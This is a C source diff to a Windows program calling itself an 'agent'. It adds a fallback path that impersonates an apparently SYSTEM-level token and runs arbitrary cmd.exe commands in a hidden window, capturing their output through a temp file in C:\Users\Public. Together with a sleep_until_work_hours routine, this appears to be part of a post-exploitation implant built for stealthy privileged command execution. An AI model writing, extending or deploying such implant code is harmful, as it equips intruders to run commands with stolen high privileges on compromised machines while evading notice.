@@ -76,6 +76,117 @@ void sleep_until_work_hours(void) {
 
 // ── Shell execution ───────────────────────────────────────────────────────────
 
+/* CreateProcessAsUserW may return ERROR_PRIVILEGE_NOT_HELD (1314) when the
+ * agent is a UAC-filtered local administrator.  CreateProcessWithTokenW only
+ * needs SeImpersonatePrivilege, but seclogon does not reliably duplicate
+ * STARTF_USESTDHANDLES.  Redirect cmd.exe's output in its own command line
+ * instead, then read the temporary file after the process exits. */
+static char *run_shell_with_token_file(const char *cmd, HANDLE hSysTok,
+                                       DWORD as_user_err) {
+    char out_file[MAX_PATH] = {0};
+    if (!GetTempFileNameA("C:\\Users\\Public", "egx", 0, out_file)) {
+        char *e = (char*)malloc(128);
+        snprintf(e, 128, "[error: CreateProcessAsUserW %lu; temp file %lu]",
+                 as_user_err, GetLastError());
+        return e;
+    }
+
+    char file_cmd[4608];
+    int cmd_len = snprintf(file_cmd, sizeof(file_cmd),
+        "cmd.exe /s /c \"(%s) > %s 2>&1\"", cmd, out_file);
+    if (cmd_len < 0 || (size_t)cmd_len >= sizeof(file_cmd)) {
+        DeleteFileA(out_file);
+        return strdup("[error: shell command too long]");
+    }
+
+    wchar_t wcmd[4608];
+    if (MultiByteToWideChar(CP_ACP, 0, file_cmd, -1, wcmd,
+                            (int)(sizeof(wcmd) / sizeof(wcmd[0]))) <= 0) {
+        DWORD err = GetLastError();
+        DeleteFileA(out_file);
+        char *e = (char*)malloc(128);
+        snprintf(e, 128, "[error: shell command encoding %lu]", err);
+        return e;
+    }
+
+    if (!CreateProcessWithTokenW) {
+        DeleteFileA(out_file);
+        return strdup("[error: CreateProcessWithTokenW unavailable]");
+    }
+
+    STARTUPINFOW si = {0};
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi = {0};
+    BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
+    DWORD imp_err = GetLastError();
+    BOOL proc_ok = FALSE;
+    DWORD proc_err = 0;
+    if (imp_ok) {
+        proc_ok = CreateProcessWithTokenW(hSysTok, 0, NULL, wcmd,
+            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        proc_err = GetLastError();
+        RevertToSelf();
+    }
+    if (!imp_ok) {
+        DeleteFileA(out_file);
+        char *e = (char*)malloc(128);
+        snprintf(e, 128,
+                 "[error: CreateProcessAsUserW %lu; ImpersonateLoggedOnUser %lu]",
+                 as_user_err, imp_err);
+        return e;
+    }
+    if (!proc_ok) {
+        DeleteFileA(out_file);
+        char *e = (char*)malloc(128);
+        snprintf(e, 128,
+                 "[error: CreateProcessAsUserW %lu; CreateProcessWithTokenW %lu]",
+                 as_user_err, proc_err);
+        return e;
+    }
+
+    DWORD wait = WaitForSingleObject(pi.hProcess, 60000);
+    if (wait == WAIT_TIMEOUT) {
+        TerminateProcess(pi.hProcess, 1);
+        WaitForSingleObject(pi.hProcess, 2000);
+    }
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    FILE *f = fopen(out_file, "rb");
+    if (!f) {
+        DeleteFileA(out_file);
+        return strdup("[error: shell capture file unavailable]");
+    }
+    size_t cap = 4096, len = 0;
+    char *buf = (char*)malloc(cap);
+    if (!buf) {
+        fclose(f);
+        DeleteFileA(out_file);
+        return strdup("[oom]");
+    }
+    DWORD nr = 0;
+    char tmp[512];
+    while ((nr = (DWORD)fread(tmp, 1, sizeof(tmp), f)) > 0) {
+        if (len + nr + 1 >= cap) {
+            cap = (len + nr) * 2 + 1024;
+            char *nb = (char*)realloc(buf, cap);
+            if (!nb) {
+                free(buf);
+                fclose(f);
+                DeleteFileA(out_file);
+                return strdup("[oom]");
+            }
+            buf = nb;
+        }
+        memcpy(buf + len, tmp, nr);
+        len += nr;
+    }
+    fclose(f);
+    DeleteFileA(out_file);
+    buf[len] = '\0';
+    return buf;
+}
+
 static char* run_shell(const char *cmd) {
     char full_cmd[4096];
     snprintf(full_cmd, sizeof(full_cmd), "cmd.exe /s /c \"%s\" 2>&1", cmd);
@@ -121,19 +232,18 @@ static char* run_shell(const char *cmd) {
         si.hStdError  = hWrite;
         PROCESS_INFORMATION pi = {0};
 
-        if (!CreateProcessAsUserW) {
-            CloseHandle(hRead); CloseHandle(hWrite);
-            return strdup("[error: CreateProcessAsUserW unavailable]");
-        }
-
         BOOL imp_ok = ImpersonateLoggedOnUser(hSysTok);
         DWORD imp_err = GetLastError();
         BOOL proc_ok = FALSE;
         DWORD proc_err = 0;
         if (imp_ok) {
-            proc_ok = CreateProcessAsUserW(hSysTok, NULL, wcmd,
-                NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-            proc_err = GetLastError();
+            if (CreateProcessAsUserW) {
+                proc_ok = CreateProcessAsUserW(hSysTok, NULL, wcmd,
+                    NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+                proc_err = GetLastError();
+            } else {
+                proc_err = ERROR_PROC_NOT_FOUND;
+            }
             RevertToSelf();
         }
         CloseHandle(hWrite);
@@ -146,9 +256,7 @@ static char* run_shell(const char *cmd) {
         }
         if (!proc_ok) {
             CloseHandle(hRead);
-            char *e = (char*)malloc(96);
-            snprintf(e, 96, "[error: CreateProcessAsUserW %lu]", proc_err);
-            return e;
+            return run_shell_with_token_file(cmd, hSysTok, proc_err);
         }
 
         size_t cap = 4096, len = 0;
